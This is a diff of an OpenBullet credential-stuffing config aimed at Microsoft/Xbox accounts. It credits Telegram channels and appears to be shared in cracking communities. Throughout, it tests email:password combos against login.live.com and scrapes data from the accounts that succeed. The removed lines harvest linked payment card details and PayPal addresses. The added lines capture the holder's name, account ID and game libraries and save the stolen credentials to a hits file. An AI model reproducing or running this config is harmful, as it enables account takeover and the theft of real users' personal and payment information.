@@ -3,9 +3,9 @@
   "Name": "XBOX",
   "SuggestedBots": 100,
   "MaxCPM": 0,
-  "LastModified": "2021-06-03T20:26:25.3070775+04:30",
-  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
-  "Author": "@Hogo_Victor",
+  "LastModified": "2020-07-24T19:35:58.4450875+04:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce  | CPM: 500_3000 | Capture | Save Hits | Move No Games To Free |",
+  "Author": "@H0S31N (Edited + Fix)",
   "Version": "1.4.4 [Anomaly]",
   "IgnoreResponseErrors": false,
   "MaxRedirects": 8,
@@ -18,13 +18,7 @@
   "AllowedWordlist1": "MailPass",
   "AllowedWordlist2": "",
   "DataRules": [],
-  "CustomInputs": [
-    {
-      "Description": "Author Telegram Id:@Hogo_Victor",
-      "VariableName": "",
-      "Id": 350501738
-    }
-  ],
+  "CustomInputs": [],
   "CaptchaUrl": "",
   "Base64": "",
   "Grayscale": false,
@@ -56,7 +50,7 @@
 }
 
 [SCRIPT]
-#Login REQUEST POST "https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0" 
+#POST REQUEST POST "https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0" 
   CONTENT "i13=0&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DZshWk88CvvuA9vSOHldJLurwIJH4a7uUREfu4fGCsbB2nL*YUw36i0Lz7tZDGptQxZhUTW0%21*ZM3oIUxGKEeEa1gcx%21XzBNiXpzf*U9iH68RaP3u20G0J6k2%21UdeMFc9C9uusE3IwI3gi4u7wJzyq8FCiNuk2Hly66dMuX96mSwHTYXgtZZpS%21rbS35jrsdC%21Ku4UysydsP0MXSz2klYp9KU%21hDHeKBZIu13h%21rQk9jG2vzCW4OerTedipQDJRuAg%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099" 
   CONTENTTYPE "application/x-www-form-urlencoded" 
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
@@ -88,7 +82,36 @@ KEYCHECK BanOnToCheck=FALSE
   KEYCHAIN Custom "CUSTOM" OR 
     KEY "/Abuse?mkt=" 
 
-#Get REQUEST GET "https://account.xbox.com/en-us/social/api/UserDataMeControl" 
+#XNXX PARSE "<SOURCE>" LR "uaid=" "\"" -> VAR "XNXX" 
+
+#Token PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"t\" id=\"t\" value=\"" "\">" -> VAR "Token" 
+
+#KOS PARSE "<SOURCE>" LR "id=\"pprid\" value=\"" "\">" -> VAR "KOS" 
+
+#KIRI PARSE "<SOURCE>" LR "name=\"NAP\" id=\"NAP\" value=\"" "\">" -> VAR "KIRI" 
+
+#KIR PARSE "<SOURCE>" LR "name=\"ANON\" id=\"ANON\" value=\"" "\">" -> VAR "KIR" 
+
+#GET1 REQUEST GET "https://login.live.com/me.srf?wa=wsignin1.0&wreply=https%3A%2F%2Fwww.xbox.com&uaid=<XNXX>&partnerId=xboxcomuhf" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+
+#Post_IDS REQUEST POST "https://account.xbox.com/en-us/accountcreation?returnUrl=https:%2f%2fwww.xbox.com:443%2fen-US%2f&ru=https:%2f%2fwww.xbox.com%2fen-US%2f&rtc=1&wa=wsignin1.0" 
+  CONTENT "pprid=<KOS>&NAP=<KIRI>&ANON=<KIR>&t=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+
+#GET_Follower REQUEST GET "https://account.xbox.com/en-us/Profile?xr=socialtwistnav" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Followers_Count PARSE "<SOURCE>" LR "\"FollowersCount\":" "," CreateEmpty=FALSE -> CAP "Followers Count" 
+
+#True_Sign REQUEST GET "https://account.xbox.com/en-us/social/api/UserDataMeControl" 
   
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
   HEADER "Pragma: no-cache" 
@@ -98,56 +121,62 @@ KEYCHECK BanOnToCheck=FALSE
   KEYCHAIN Success OR 
     KEY "\"IsSignedIn\":true" 
 
-#Get REQUEST GET "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none" 
+#First_Name PARSE "<SOURCE>" LR "\"FirstName\":\"" "\"" CreateEmpty=FALSE -> CAP "First Name" 
+
+#LastName PARSE "<SOURCE>" LR "\"LastName\":\"" "\"" CreateEmpty=FALSE -> CAP "Last Name" 
+
+#CID PARSE "<SOURCE>" LR "\"CID\":\"" "\"" CreateEmpty=FALSE -> CAP "CID" 
+
+#Account_Tier PARSE "<SOURCE>" LR "\"AccountTier\":\"" "\"" CreateEmpty=FALSE -> CAP "Account Tier" 
+
+#GET_X1 REQUEST GET "https://account.xbox.com/en-us/MyGames?gameType=XboxOne" 
   
-  HEADER "Host: login.live.com" 
-  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
-  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
-  HEADER "Accept-Language: en-US,en;q=0.5" 
-  HEADER "Accept-Encoding: gzip, deflate" 
-  HEADER "Connection: close" 
-  HEADER "Referer: https://account.microsoft.com/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
 
-#Token PARSE "<ADDRESS>" LR "access_token=" "&token_type" -> VAR "Token" 
+SET VAR "XBOXGAMESRC" "<SOURCE>" TRUE
 
-#urlDecode FUNCTION URLDecode "<Token>" -> VAR "urlDecode" 
-
-#Get REQUEST GET "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB" 
+#GET_Pc REQUEST GET "https://account.xbox.com/en-us/MyGames?gameType=PC" 
   
-  HEADER "Host: paymentinstruments.mp.microsoft.com" 
-  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
-  HEADER "Accept: application/json" 
-  HEADER "Accept-Language: en-US,en;q=0.5" 
-  HEADER "Accept-Encoding: gzip, deflate" 
-  HEADER "Referer: https://account.microsoft.com/" 
-  HEADER "Content-Type: application/json" 
-  HEADER "Authorization: MSADELEGATE1.0=\"<urlDecode>\"" 
-  HEADER "ms-cV: SwJLZKwVZhdTPb7TZ5VvSV.2" 
-  HEADER "Origin: https://account.microsoft.com" 
-  HEADER "Connection: close" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
 
-IF "<SOURCE>" Contains "cardType"
-SET CAP "CC Linked" "Yes"
+SET VAR "PCGAMESRC" "<SOURCE>" TRUE
 
-#cardType PARSE "<SOURCE>" LR "cardType\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "cardType" 
+#Xbox PARSE "<XBOXGAMESRC>" REGEX "\"Heading\":\"(.*?)\",\"" "[1]" Recursive=TRUE -> VAR "XKIRI" 
 
-#lastFourDigits PARSE "<SOURCE>" LR "lastFourDigits\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "lastFourDigits" 
+#PC PARSE "<PCGAMESRC>" REGEX "\"Heading\":\"(.*?)\",\"" "[1]" Recursive=TRUE -> VAR "KONI" 
 
-#expiryYear PARSE "<SOURCE>" LR "expiryYear\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "expiryYear" 
+#Xbox_Games FUNCTION Replace "," " / " "<XKIRI>" -> CAP "Xbox Games" 
 
-#expiryMonth PARSE "<SOURCE>" LR "expiryMonth\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "expiryMonth" 
+#R1 FUNCTION Replace "[" "" "<Xbox Games>" -> VAR "R1" 
 
-ELSE
-SET CAP "CC Linked" "No"
-ENDIF
-IF "<SOURCE>" Contains "email"
-SET CAP "Paypal Linked" "Yes"
+#R2 FUNCTION Replace "]" "" "<R1>" -> VAR "R2" 
 
-#Paypal_Address PARSE "<SOURCE>" LR "email\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Paypal Address" 
+#R3 FUNCTION Replace " / " "\\n" "<R2>" -> VAR "R3" 
 
-ELSE
-SET CAP "Paypal Linked" "No"
-ENDIF
+#R4 FUNCTION CountOccurrences "\\n" "<R3>" -> VAR "R4" 
 
-#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+#Nummber_Games FUNCTION Compute "<R4>+1" -> CAP "Number Of Xbox Games" 
+
+#PC_Games FUNCTION Replace "," " / " "<KONI>" -> CAP "PC Games" 
+
+#R10 FUNCTION Replace "[" "" "<PC Games>" -> VAR "R10" 
+
+#R20 FUNCTION Replace "]" "" "<R10>" -> VAR "R20" 
+
+#R30 FUNCTION Replace " / " "\\n" "<R20>" -> VAR "R30" 
+
+#R40 FUNCTION CountOccurrences "\\n" "<R30>" -> VAR "R40" 
+
+#Number_Of_PC_Games FUNCTION Compute "<R40>+1" -> CAP "Number Of PC Games" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Xbox Games>" Contains "[]" 
+    KEY "<PC Games>" Contains "[]" 
+
+#Sava UTILITY File "XBOX Hits.txt" AppendLines "<<<<<<=Account=>>>>>>\\nCombo: <USER>:<PASS>\\nEmail:  <USER>\\nPassword: <PASS>\\n<<<<<<<<<<<=Information=>>>>>>>>>>\\nFirst Name: <First Name>\\nLast Name: <Last Name>\\nFollowers Count: <Followers Count>\\nCID: <CID>\\nAccount Tier: <Account Tier>\\n<<<<<=Xbox Games=>>>>>\\nNumber Of Games: <Number Of Xbox Games>\\n[[[[[Games List]]]]]:\\n <R3>\\n\\n<<<<<<<=PC Games=>>>>>>>\\nNumber Of Games: <Number Of PC Games>\\n[[[[[Games List]]]]]\\n <R30>\\n\\n\\nTelegram Channel: T.me/BruteForce\\n==================================================================" -> VAR "Save" 
 
